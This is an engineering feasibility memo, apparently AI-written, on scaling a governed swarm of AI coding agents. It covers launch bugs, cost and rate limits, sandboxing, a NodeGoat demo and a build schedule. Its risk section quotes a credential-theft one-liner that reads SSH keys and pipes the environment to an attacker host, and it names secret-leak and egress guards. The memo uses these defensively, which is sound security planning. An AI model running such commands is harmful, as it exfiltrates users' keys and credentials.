Verified against the actual code: the void fan-out loop (`swarm-orchestrator.ts:142`), the `--admin-all` receipt bug (`chio-governor.ts:104`), the `PORT` env vs optimistic URL bug (`openknowledge-engine.ts:94/99/115`), `WorktreeManager.remove` defined but never called, `swarm_detect.rs` emitting counts-only JSON, and `lib.rs:679` evaluating only `GuardAction::ResponseAction`. All four lanes hold up. Note below.

---

# AMBUSH — Engineering Feasibility & Build-Plan

## 1. Verdict and the hardest risks

**Yes — the headline (massive governed fan-out + signed receipts + durable intel) is buildable and operable, but the demo-ready version is not what ships today.** Every primitive exists in real code: 100-way fan-out (`swarm-orchestrator.ts:130-142`), per-vector git isolation (`worktree-manager.ts:32-68`), a fail-closed governance wrapper (`chio-governor.ts:83-98`), a durable markdown vault rolled into `RUNBOOK.md` (`swarm-orchestrator.ts:286-328`), and — in the Rust engine — a fully-implemented guard pipeline and Ed25519 signed receipts. The gap is not architecture; it is that the control plane wires these primitives together optimistically, with no backpressure, no cleanup, no sandbox, and three demo-killing bugs.

Ranked technical risks:

1. **Unbounded fan-out detonates the host before it detonates the wallet.** `deploySwarm` fires `void this.launchVector(vector)` in a tight loop (`swarm-orchestrator.ts:142`) — no await, no semaphore. 100 lanes = ~600-900 steady processes + ~300 transient `git` spawns + 100 `npx @latest` cold-resolves in one event-loop tick. The binding constraint is RAM (~300-700 MB/lane → ~30-50 lanes on 32 GB) and `kern.tty.ptmx_max=511`, not CPU.
2. **No OS sandbox + full-environment inheritance.** Every agent gets `env: { ...process.env }` (`swarm-orchestrator.ts:194`), including the raw `bash` shell profile. A shell lane can `cat ~/.ssh/id_rsa` or `env | curl attacker`. The worktree is git isolation, not OS isolation.
3. **Receipts are trusted, unverified, and partly fake.** Control-plane Chio receipts are real but never signature-verified; the engine's real Ed25519 receipts only exist in serve mode and don't flow to the UI at all yet.
4. **Silent reliability leaks.** `WorktreeManager.remove` is implemented (`worktree-manager.ts:71-84`) but **never called** — worktrees, branches, and the in-memory `handles` map leak on every deploy/kill/redeploy. Readiness is faked with fixed 1200 ms/400 ms timers (`:212-214`) that race the launch storm.
5. **Convergence is real but blocked on a 6-line engine patch** (see §4): `swarm_detect --json` emits finding *counts only* (verified: the `json!` block carries `finding_count`/`deposit_count`, never the `findings` bodies that exist one line up at `bundle.replay.bundle.findings`).

## 2. Cost / reliability envelope

**Cost (100 lanes × 1 hour, Claude Code, cache-warm):** ~$500-1,150 on Sonnet 4.6, ~$800-1,900 on Opus 4.8, ~$350-450 on Haiku. Model: a looping agent runs ~120 turns/hr re-sending a mostly-cached prefix; ~$0.04/turn → ~$5/lane-hr on Sonnet. **The number to fear is the pathological column: ~$4,300-7,200/hr if turns drift >5 min apart and the ephemeral cache TTL expires**, re-billing 120K context at full input price. That blowup is *triggered by the throttling that 100 concurrent lanes cause* — a doom loop.

**Where it breaks first is rate limits, not dollars.** All lanes share one credential (`...process.env`). At heavy fan-out, 100 lanes emit ~200K output-tokens/min, exceeding standard-tier OTPM caps → 429 → backoff → stall → cache loss → cost blowup. If `claude` is on a Pro/Max seat, 100 headless agents exhaust a single 5-hour window in minutes and it is a ToS-shaped use of one subscription.

**Minimum reliability work so the demo isn't embarrassing (~1.5 wk, independently shippable):**
- **Bounded staged-ramp launcher** — a tiny `Semaphore(min(cpus,8))` + ~150 ms ramp delay replacing the `void` loop. Bounds the *launch* storm (git+npx+spawn+readiness) while still letting warm lanes run concurrently.
- **PTY-quiescence readiness** — replace the fixed timers with "first-byte seen AND quiet for 400 ms (or ready-marker match), hard-timeout 20 s," using the bus terminal stream already present. This kills the #1 "launched but did nothing" failure where the prompt is typed into an un-initialized TUI.
- **Wire `worktree.remove` + a startup `git worktree prune` reaper** into `onTerminalExit`/`killVector`, gated behind a `keepWorktrees` flag for forensics.

## 3. Safety-engineering shortlist (cheapest defensible controls)

The engine already ships the weapons: `ForbiddenPathGuard`, `ShellCommandGuard`, `SecretLeakGuard`, `EgressAllowlistGuard`, fail-closed `GuardPipeline` (swarm-guard). But `swarm-runtime` only evaluates `GuardAction::ResponseAction` (**verified `lib.rs:679`**) — the `FileAccess`/`ShellCommand`/`NetworkEgress` variants are built, tested, and never enforced on agents. Cheapest high-impact subset, in order:

1. **EnvScrub (~1 day, all platforms, zero deps).** Stop spreading `process.env`; pass a curated allowlist (`PATH`, `TERM`, `LANG`, per-vector scratch `HOME` so `~/.ssh` literally doesn't exist, `AMBUSH_*`, and only the specific provisioned API key). Closes the worst exfil channel — env creds need no filesystem access.
2. **Global concurrency semaphore + wall-clock deadline + process-group kill (~2-3 days).** Fixes the per-call clamp bug (`count` is clamped per call at `:130` but vectors *append* at `:131`, so repeated `deploySwarm(100)` accumulates >100). `proc.kill()` (`pty-manager.ts:60`) doesn't reap subtrees — kill the sandbox wrapper / process group instead.
3. **OS sandbox wrapper (~1-1.5 wk):** bubblewrap (Linux, rootless, `--unshare-all --die-with-parent`, empty `$HOME`) / `sandbox-exec` (macOS Seatbelt, deny-by-default `.sb`) wrapping the agent argv. **Fail-closed for the `shell` profile** — invert today's fail-open behavior (`chio-governor.ts:57`).
4. **Tighten `DEFAULT_POLICY` + reuse swarm-guard (~1 wk).** Drop blanket `exec` from the Chio allow-list; expose the guards via a `swarmctl guard eval --json` subcommand and a broker on the MCP path so `SecretLeakGuard`/`ShellCommandGuard` actually decide agent writes/exec.

Defer to Phase 2: egress proxy (reuse `EgressAllowlistGuard::is_allowed`), token metering, anomaly auto-kill, container tier.

## 4. Convergence build plan — wire the engine now, narrowly

**Recommendation: yes, but a thin Stage-1 only.** It is a low-risk, high-symbolism win (the two halves "talk") that mirrors the proven `OpenKnowledgeEngine` subprocess pattern, at ~1.5-2.5 wk. The unlock is one **load-bearing 6-line engine patch**: `swarm_detect.rs`'s `--json` block emits counts only (**verified**), so a `SwarmEngine` bridge would return zero findings. The bodies already exist at `bundle.replay.bundle.findings`; serialize them via the existing `SwarmFindingEnvelope::from`, stamped `output_schema_version: 1`.

**Stage-1 scope (`src/main/engine/swarm-engine.ts`, modeled 1:1 on `openknowledge-engine.ts`):**
- `resolveInvoker()` via `which('swarm_detect'/'swarmctl')`; degrade gracefully when absent.
- `runDetection(scenario)` → shell out `--json` → **balanced-brace JSON scanner** (not `split('\n')` — the trailing summary is multi-line `to_string_pretty`) → normalize and write `findings/detections/*.md` into the same vault `consolidate()` globs.
- Normalize from *real* serde, not the doc: `Severity` is SCREAMING_SNAKE → `.toLowerCase()`; `ThreatClass::Custom` serializes `{"custom":"…"}` → flatten; `hostId` is **always null** in CLI mode (only the serve-mode `RuntimeEvent::Finding` carries it).
- `listEngineReceipts()` → synthetic `ReceiptSummary{source:'engine'}` from replay `policy_verdict`/`response_kind`, **clearly labeled** — real Ed25519 receipts are deferred to Stage 2 SSE. Pin `EXPECTED_SCHEMA_VERSION=1`; refuse to write the vault on mismatch.

Stage 2 (serve + SSE, port/lifecycle ownership) is the later bet. Keep the seam thin: reserve `evt:engineSwarm:finding/receipt` channels now.

## 5. Killer demo + benchmark + must-not-faceplant

**Demo: security code-review swarm against OWASP NodeGoat at a pinned SHA.** It engages the real differentiators (worktrees, fan-out, governed writes, consolidate), needs no live target infra, is safe to record, and its OWASP-Top-10 tutorial is a ready-made answer key. **N=7 Claude Code lanes** = exactly one `DEFAULT_PLAYBOOK` cycle (recon→report) and N≤12 had 0 worktree failures in lane testing (N=50 → 2/50 lock failures). Route the findings payoff through **Consolidate + the Intel wiki**, not live per-card badges — interactive `claude` never exits, and `hasFindings` is only set in `onTerminalExit` (`:224`).

**Must-not-faceplant checklist (all code-verified):**
1. **[HIGH] Receipts pane is permanently empty.** `chio-governor.ts:104` passes `--admin-all`, which chio's `receipt list` rejects → non-zero exit → `[]`. **Delete the flag.** Without it the whole governance beat is dead.
2. **[HIGH] Intel wiki loads a dead port.** `openknowledge-engine.ts:94` sets `PORT` env but `ok start` wants `-p <port>`; then `:115` optimistically sets the URL and `:99`'s parser only adopts the real one `if (m && !this.status.url)` (now false). **Pass `['start','-p',String(UI_PORT)]` and init `status.url=null`.**
3. **[CRITICAL/env] Claude Code trust prompt hangs all lanes** in fresh worktrees — pre-trust or add `--permission-mode acceptEdits`.
4. **[HIGH/env] `node-pty` must be rebuilt** or it silently degrades to TTY-less pipes (`pty-manager.ts:16-25`) that break TUI agents.
5. **[MED/env] Pre-warm npx/chio** so the Intel UI isn't a cold download mid-demo.

**Benchmark — two tracks, both reproducible.** Track A: deterministic fan-out latency with **shell lanes (no LLM)**, sweep N∈{1,5,10,25,50,100}, report median+p95 time-to-N-running and worktree success rate — this is the bit-for-bit re-runnable "fan-out in seconds" proof. Track B: real `claude-batch` (`claude -p`, exits cleanly) scored against `answer-key.nodegoat.yaml` for recall/precision/% consolidated/receipts/graph edges-per-node. Pin everything in `bench-manifest.json` (repo SHA, model id, chio + open-knowledge versions, host), read the receipt DB directly (independent of the UI), and report variance across 3 repeats.

## 6. Sequenced 8-week punch-list (value-to-effort ordered)

| # | Item | Effort | Why first |
|---|------|--------|-----------|
| 1 | **Three demo bug fixes**: drop `--admin-all` (`chio:104`), fix `ok` port (`engine:94/115`), `fs.watch` findings → live `hasFindings` | 2-3 d | One-to-few lines each; without them the demo faceplants on camera |
| 2 | **EnvScrub** — curated env + scratch `HOME` (`orchestrator:194`) | 1 d | Closes the worst exfil channel, zero deps |
| 3 | **Bounded staged-ramp launcher** + global semaphore + fix per-call clamp bug (`:130-142`) | 2-3 d | Stops the host-detonation; makes high-N survivable |
| 4 | **Process-group kill + wire `worktree.remove` + startup reaper** | 2-3 d | Stops the silent worktree/handle/branch leak and orphan subprocesses |
| 5 | **PTY-quiescence readiness** replacing fixed timers | 3-4 d | Kills "launched but did nothing"; lets the semaphore release on real readiness |
| 6 | **Two-track benchmark harness** + NodeGoat answer key + `claude-batch` profile | 4-6 d | Makes the claim publishable and credible |
| 7 | **Stage-1 SwarmEngine bridge** + the 6-line `swarm_detect.rs` findings patch | 1.5-2.5 wk | The convergence story; low-risk, mirrors `OpenKnowledgeEngine` |
| 8 | **OS sandbox (bwrap/sandbox-exec) + fail-closed `shell` tier** | 1-1.5 wk | Makes running offensive agents defensible |
| 9 | **swarm-guard exposure** (`swarmctl guard eval`) + MCP broker + tighten `DEFAULT_POLICY` | 1 wk | Argument-level enforcement with receipts, reusing tested guards |
| 10 | **Per-lane wall-clock/idle watchdogs + UI cost estimator + metrics surface** | 3-4 d | Runaway control + the "~$1,400/hr" operator signal |

Weeks 1-2 = items 1-5 (demo no longer embarrasses + worst safety hole closed). Weeks 3-4 = items 6-7 (benchmark + convergence). Weeks 5-8 = items 8-10 (defensible sandbox/governance + observability). **Deferred long pole**: per-lane credentials + 429-aware global rate governor (~1.5 wk) — the trickiest and most coupled to the model API; schedule it as its own milestone once the host-side reliability is solid, because at this fan-out the binding constraint is rate limits, not the host.

**Open questions that change the plan:** which model the bare `claude` profile actually uses (API key vs Max seat — binary ToS exposure); target hardware (the "100" headline only holds on 64 GB+ with API-key auth); and whether the `engine/` repo is in-scope to patch (if frozen, Stage-1 convergence must jump to serve+SSE earlier than planned).